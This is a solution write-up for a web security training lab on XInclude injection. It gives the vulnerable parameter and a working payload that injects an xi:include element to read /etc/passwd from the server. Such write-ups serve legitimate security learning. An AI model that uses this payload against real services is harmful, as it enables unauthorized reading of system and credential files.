# Lab 05 — Exploiting XInclude to retrieve files

> **Practitioner** · [Official lab](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

**Entry point:** `POST /product/stock` — the client-supplied `productId` is
embedded **into** a server-generated XML document (you can't add a DOCTYPE).

## Solution

1. Since you can't define entities, use the XInclude namespace inside the
   value itself. `/etc/passwd` isn't valid XML, so add `parse="text"`:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

i.e. `productId` becomes:

```
<xi:include href="file:///etc/passwd" parse="text"/>
```

with the namespace declared on the wrapper you inject.

2. The response echoes the included file contents — lab solved.

## Notes

XInclude works *after* XML generation — it defeats "we build the XML for
you" designs.
